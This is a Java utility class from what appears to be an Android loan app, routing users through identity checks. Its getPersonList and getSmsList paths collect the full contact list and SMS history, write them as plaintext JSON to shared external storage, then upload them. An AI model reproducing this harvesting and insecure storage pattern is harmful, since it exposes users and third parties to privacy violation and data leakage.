package com.skyvn.ten.util;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;

import com.blankj.utilcode.util.FileUtils;
import com.google.gson.Gson;
import com.skyvn.ten.api.HttpResultSubscriber;
import com.skyvn.ten.api.HttpServerImpl;
import com.skyvn.ten.bean.AttentionSourrssBO;
import com.skyvn.ten.bean.ContactBO;
import com.skyvn.ten.bean.GoHomeEvent;
import com.skyvn.ten.bean.SmsBO;
import com.skyvn.ten.config.IConstant;
import com.skyvn.ten.util.phone.PhoneDto;
import com.skyvn.ten.util.phone.PhoneUtil;
import com.skyvn.ten.view.CommonMsgActivity;
import com.skyvn.ten.view.DialogAttentionActivity;
import com.skyvn.ten.view.JiaZhaoActivity;
import com.skyvn.ten.view.LiveAttentionActivity;
import com.skyvn.ten.view.Msg14Activity;
import com.skyvn.ten.view.VideoActivity;
import com.skyvn.ten.view.bindbankcard.BindBankCardActivity;
import com.skyvn.ten.view.emergencycontact.EmergencyContactActivity;
import com.skyvn.ten.view.person_msg_style.PersonMsgActivity;
import com.skyvn.ten.view.person_msg_style.PersonMsgActivity2;
import com.skyvn.ten.view.shiming_style.ShiMingActivity;
import com.skyvn.ten.view.shiming_style.ShiMingActivity2;

import org.greenrobot.eventbus.EventBus;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * author : wuliang
 * e-mail : wuliang6661@163.com
 * date   : 2020/1/1910:27
 * desc   :  根据认证顺序判断去哪个页面
 * version: 1.0
 */
public class AuthenticationUtils {

    public static final String PERSON_MSG = "auth.code.user.Info";// 个人资料认证
    public static final String ID_CARD = "auth.code.idcard";   //身份证认证
    public static final String LIVE_PAGE = "auth.code.active";  //活体验证
    public static final String CONTACT_PAGE = "auth.code.contact";  //紧急联系人
    public static final String DEVICE_PAGE = "auth.code.driving";    //驾照验证
    public static final String PHONE_COMMON = "auth.code.operate";   //运营商验证
    public static final String PHONE_LIST = "auth.code.address";      //通讯录验证
    public static final String BIND_BANK_CARD = "auth.code.band.card";   //绑定银行卡验证
    public static final String SMS__JILU_PAGE = "auth.code.sms.record";         //短信记录认证
    public static final String SMS_PAGE = "auth.code.sma.1414";       //短信1414验证
    public static final String VIDEO_PAGE = "auth.code.video";    //视频验证
    public static final String COMMON_MSG_PAGE = "auth.code.company.info";   //公司信息认证


    public static void goAuthNextPage(String pageNo, int needSourss, Activity context) {
        switch (pageNo) {
            case PERSON_MSG:
                if (IConstant.STYLE == 1) {
                    gotoActivity(PersonMsgActivity.class, needSourss, true, context);
                } else {
                    gotoActivity(PersonMsgActivity2.class, needSourss, true, context);
                }
                break;
            case ID_CARD:
                if (IConstant.STYLE == 1) {
                    gotoActivity(ShiMingActivity.class, needSourss, true, context);
                } else {
                    gotoActivity(ShiMingActivity2.class, needSourss, true, context);
                }
                break;
            case LIVE_PAGE:
                gotoActivity(LiveAttentionActivity.class, needSourss, true, context);
                break;
            case CONTACT_PAGE:
                gotoActivity(EmergencyContactActivity.class, needSourss, true, context);
                break;
            case DEVICE_PAGE:
                gotoActivity(JiaZhaoActivity.class, needSourss, true, context);
                break;
            case PHONE_COMMON:

                break;
            case PHONE_LIST:
//                if (needSourss == 0) {   //可以跳过
//                    new AlertDialog(context).builder().setGone().setTitle(context.getResources().getString(R.string.tishi))
//                            .setMsg(context.getResources().getString(R.string.contact_aleg_dialog))
//                            .setCancelable(false)
//                            .setNegativeButton(context.getResources().getString(R.string.tiaoguo), new View.OnClickListener() {
//                                @Override
//                                public void onClick(View view) {
//                                    jump(PHONE_LIST);
//                                }
//                            })
//                            .setPositiveButton(context.getResources().getString(R.string.hao), v -> {
//                                requestPermission(context);
//                            }).show();
//                } else {// 不能跳过
//                    new AlertDialog(context).builder().setGone().setTitle(context.getResources().getString(R.string.tishi))
//                            .setMsg(context.getResources().getString(R.string.contact_aleg_dialog))
//                            .setCancelable(false)
//                            .setNegativeButton(context.getResources().getString(R.string.buyunxu), view ->
//                                    context.finish())
//                            .setPositiveButton(context.getResources().getString(R.string.hao), v -> {
//                                requestPermission(context);
//                            }).show();
//                }
                Intent intent = new Intent(context, DialogAttentionActivity.class);
                intent.putExtra("needStatus", needSourss);
                intent.putExtra("type", 0);
                context.startActivity(intent);
                break;
            case BIND_BANK_CARD:
                gotoActivity(BindBankCardActivity.class, needSourss, true, context);
                break;
            case SMS__JILU_PAGE:
//                if (needSourss == 0) {   //可以跳过
//                    new AlertDialog(context).builder().setGone().setTitle(context.getResources().getString(R.string.tishi))
//                            .setMsg(context.getResources().getString(R.string.sms_aleg_dialog))
//                            .setCancelable(false)
//                            .setNegativeButton(context.getResources().getString(R.string.tiaoguo), view -> jump(SMS__JILU_PAGE))
//                            .setPositiveButton(context.getResources().getString(R.string.hao), v -> {
//                                requestSmsPermission(context);
//                            }).show();
//                } else {// 不能跳过
//                    new AlertDialog(context).builder().setGone().setTitle(context.getResources().getString(R.string.tishi))
//                            .setMsg(context.getResources().getString(R.string.sms_aleg_dialog))
//                            .setCancelable(false)
//                            .setNegativeButton(context.getResources().getString(R.string.buyunxu), view ->
//                                    context.finish())
//                            .setPositiveButton(context.getResources().getString(R.string.hao), v -> {
//                                requestSmsPermission(context);
//                            }).show();
//                }
                Intent intent1 = new Intent(context, DialogAttentionActivity.class);
                intent1.putExtra("needStatus", needSourss);
                intent1.putExtra("type", 1);
                context.startActivity(intent1);
                break;
            case SMS_PAGE:
                gotoActivity(Msg14Activity.class, needSourss, true, context);
                break;
            case VIDEO_PAGE:
                gotoActivity(VideoActivity.class, needSourss, true, context);
                break;
            case COMMON_MSG_PAGE:
                gotoActivity(CommonMsgActivity.class, needSourss, true, context);
                break;
            case "-1":   //认证完成
//                gotoActivity(AttentionZiliaoActivity.class, needSourss, true, context);
                EventBus.getDefault().post(new GoHomeEvent());
                AppManager.getAppManager().goHome();
                break;
        }
    }


    public static void goAuthNextPageByHome(String pageNo, int needSourss, boolean isFinish, Activity context) {
        switch (pageNo) {
            case PERSON_MSG:
                gotoActivity(PersonMsgActivity.class, needSourss, isFinish, context);
                break;
            case ID_CARD:
                gotoActivity(ShiMingActivity.class, needSourss, isFinish, context);
                break;
            case LIVE_PAGE:
                gotoActivity(LiveAttentionActivity.class, needSourss, isFinish, context);
                break;
            case CONTACT_PAGE:
                gotoActivity(EmergencyContactActivity.class, needSourss, isFinish, context);
                break;
            case DEVICE_PAGE:
                gotoActivity(JiaZhaoActivity.class, needSourss, isFinish, context);
                break;
            case PHONE_COMMON:

                break;
            case PHONE_LIST:
//                if (needSourss == 0) {   //可以跳过
//                    new AlertDialog(context).builder().setGone().setTitle(context.getResources().getString(R.string.tishi))
//                            .setMsg(context.getResources().getString(R.string.contact_aleg_dialog))
//                            .setCancelable(false)
//                            .setNegativeButton(context.getResources().getString(R.string.tiaoguo), new View.OnClickListener() {
//                                @Override
//                                public void onClick(View view) {
//                                    jump(PHONE_LIST);
//                                }
//                            })
//                            .setPositiveButton(context.getResources().getString(R.string.hao), v -> {
//                                requestPermission(context);
//                            }).show();
//                } else {// 不能跳过
//                    new AlertDialog(context).builder().setGone().setTitle(context.getResources().getString(R.string.tishi))
//                            .setMsg(context.getResources().getString(R.string.contact_aleg_dialog))
//                            .setCancelable(false)
//                            .setNegativeButton(context.getResources().getString(R.string.buyunxu), view ->
//                                    context.finish())
//                            .setPositiveButton(context.getResources().getString(R.string.hao), v -> {
//                                requestPermission(context);
//                            }).show();
//                }
                Intent intent = new Intent(context, DialogAttentionActivity.class);
                intent.putExtra("needStatus", needSourss);
                intent.putExtra("type", 0);
                context.startActivity(intent);
                break;
            case BIND_BANK_CARD:
                gotoActivity(BindBankCardActivity.class, needSourss, isFinish, context);
                break;
            case SMS__JILU_PAGE:
//                if (needSourss == 0) {   //可以跳过
//                    new AlertDialog(context).builder().setGone().setTitle(context.getResources().getString(R.string.tishi))
//                            .setMsg(context.getResources().getString(R.string.sms_aleg_dialog))
//                            .setCancelable(false)
//                            .setNegativeButton(context.getResources().getString(R.string.tiaoguo), view -> jump(SMS__JILU_PAGE))
//                            .setPositiveButton(context.getResources().getString(R.string.hao), v -> {
//                                requestSmsPermission(context);
//                            }).show();
//                } else {// 不能跳过
//                    new AlertDialog(context).builder().setGone().setTitle(context.getResources().getString(R.string.tishi))
//                            .setMsg(context.getResources().getString(R.string.sms_aleg_dialog))
//                            .setCancelable(false)
//                            .setNegativeButton(context.getResources().getString(R.string.buyunxu), view ->
//                                    context.finish())
//                            .setPositiveButton(context.getResources().getString(R.string.hao), v -> {
//                                requestSmsPermission(context);
//                            }).show();
//                }
                Intent intent1 = new Intent(context, DialogAttentionActivity.class);
                intent1.putExtra("needStatus", needSourss);
                intent1.putExtra("type", 1);
                context.startActivity(intent1);
                break;
            case SMS_PAGE:
                gotoActivity(Msg14Activity.class, needSourss, isFinish, context);
                break;
            case VIDEO_PAGE:
                gotoActivity(VideoActivity.class, needSourss, isFinish, context);
                break;
            case COMMON_MSG_PAGE:
                gotoActivity(CommonMsgActivity.class, needSourss, isFinish, context);
                break;
            case "-1":   //认证完成
//                gotoActivity(AttentionZiliaoActivity.class, needSourss, isFinish, context);
                EventBus.getDefault().post(new GoHomeEvent());
                AppManager.getAppManager().goHome();
                break;
        }
    }


    /**
     * 常用的跳转方法
     */
    public static void gotoActivity(Class<?> cls, int needSourss, boolean isFinish, Activity context) {
        Intent intent = new Intent(context, cls);
        intent.putExtra("needStatus", needSourss);
        context.startActivity(intent);
//        if (isFinish) {
        context.finish();
//        }
    }


    public static void jump(String status) {
        HttpServerImpl.jumpAuth(status).subscribe(new HttpResultSubscriber<AttentionSourrssBO>() {
            @Override
            public void onSuccess(AttentionSourrssBO s) {
                goAuthNextPage(s.getCode(), s.getNeedStatus(), AppManager.getAppManager().curremtActivity());
            }

            @Override
            public void onFiled(String message) {
                ToastManager.showShort(message);
            }
        });
    }


    /**
     * 通讯录权限
     */
    private static void requestPermission(Activity activity) {
        if (ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(activity, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                        != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_EXTERNAL_STORAGE)
                        != PackageManager.PERMISSION_GRANTED) {//未开启定位权限
            //开启定位权限,200是标识码
            ActivityCompat.requestPermissions(activity, new String[]{Manifest.permission.READ_CONTACTS,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE}, 200);
        } else {
            getPersonList(activity);
        }
    }

    /**
     * 短信记录权限
     */
    private static void requestSmsPermission(Activity activity) {
        if (ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(activity, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                        != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_EXTERNAL_STORAGE)
                        != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_CONTACTS)
                        != PackageManager.PERMISSION_GRANTED) {
            //开启定位权限,200是标识码
            ActivityCompat.requestPermissions(activity, new String[]{Manifest.permission.READ_SMS,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_EXTERNAL_STORAGE}, 300);
        } else {
            getSmsList(activity);
        }
    }


    static List<PhoneDto> phones;

    /**
     * 获取通讯录用户
     */
    private static void getPersonList(Activity activity) {
        handler.sendEmptyMessage(0x11);
        new Thread(() -> {
            try {
                phones = new PhoneUtil(activity).searchContacts("");
                commitContactList(phones);
            } catch (Exception ex) {
                ex.printStackTrace();
                handler.sendEmptyMessage(0x22);
            }
        }).start();
    }

    static List<SmsBO> smsBOS;

    /**
     * 获取短信记录
     */
    private static void getSmsList(Activity activity) {
        handler.sendEmptyMessage(0x11);
        new Thread(() -> {
            try {
                smsBOS = SMSUtils.obtainPhoneMessage(activity);
                commitSmsList();
            } catch (Exception ex) {
                ex.printStackTrace();
                handler.sendEmptyMessage(0x22);
            }
        }).start();
    }


    /**
     * 上传短信记录验证
     */
    private static void commitSmsList() {
        String json = new Gson().toJson(smsBOS);
        String filePath = Environment.getExternalStorageDirectory().getPath() + "/saas.json";
        FileUtils.createFileByDeleteOldFile(filePath);
        try {
            FileWriter fw = new FileWriter(new File(filePath));
            BufferedWriter out = new BufferedWriter(fw);
            out.write(json);
            out.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        UpdateFileUtils utils = new UpdateFileUtils();
        utils.setListener(new UpdateFileUtils.OnCallBackListener() {
            @Override
            public void call(String s) {
                updateSms(s);
            }

            @Override
            public void callError(String message) {
                ToastManager.showShort(message);
                handler.sendEmptyMessage(0x22);
            }
        });
        utils.updateFile(4, filePath);
    }

    private static void updateSms(String url) {
        HttpServerImpl.addClientSmsRecordAuth(url).subscribe(new HttpResultSubscriber<AttentionSourrssBO>() {
            @Override
            public void onSuccess(AttentionSourrssBO s) {
                handler.sendEmptyMessage(0x22);
                goAuthNextPage(s.getCode(), s.getNeedStatus(), AppManager.getAppManager().curremtActivity());
            }

            @Override
            public void onFiled(String message) {
                ToastManager.showShort(message);
                handler.sendEmptyMessage(0x22);
            }
        });
    }


    /**
     * 上传通讯录验证
     */
    private static void commitContactList(List<PhoneDto> phoneDtos) {
        List<ContactBO> contactBOS = new ArrayList<>();
        for (PhoneDto phone : phoneDtos) {
            ContactBO contactBO = new ContactBO();
            contactBO.setPhone(phone.getTelPhone());
            contactBO.setName(phone.getName());
            contactBOS.add(contactBO);
        }
        String json = new Gson().toJson(contactBOS);
        String filePath = Environment.getExternalStorageDirectory().getPath() + "/saas.json";
        FileUtils.createFileByDeleteOldFile(filePath);
        try {
            FileWriter fw = new FileWriter(new File(filePath));
            BufferedWriter out = new BufferedWriter(fw);
            out.write(json);
            out.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        UpdateFileUtils utils = new UpdateFileUtils();
        utils.setListener(new UpdateFileUtils.OnCallBackListener() {
            @Override
            public void call(String s) {
                updateContact(s);
            }

            @Override
            public void callError(String message) {
                handler.sendEmptyMessage(0x22);
                ToastManager.showShort(message);
            }
        });
        utils.updateFile(3, filePath);
    }


    private static void updateContact(String url) {
        HttpServerImpl.commitContactList(url).subscribe(new HttpResultSubscriber<AttentionSourrssBO>() {
            @Override
            public void onSuccess(AttentionSourrssBO s) {
                handler.sendEmptyMessage(0x22);
                goAuthNextPage(s.getCode(), s.getNeedStatus(), AppManager.getAppManager().curremtActivity());
            }

            @Override
            public void onFiled(String message) {
                handler.sendEmptyMessage(0x22);
                ToastManager.showShort(message);
            }
        });
    }

    private static ProgressUtils utils;

    private static Handler handler = new Handler(AppManager.getAppManager().curremtActivity().getMainLooper()) {
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            if (utils == null) {
                utils = new ProgressUtils(AppManager.getAppManager().curremtActivity());
            }
            switch (msg.what) {
                case 0x11:
                    utils.showProgress();
                    break;
                case 0x22:
                    utils.stopProgress();
                    break;
            }
        }
    };

}
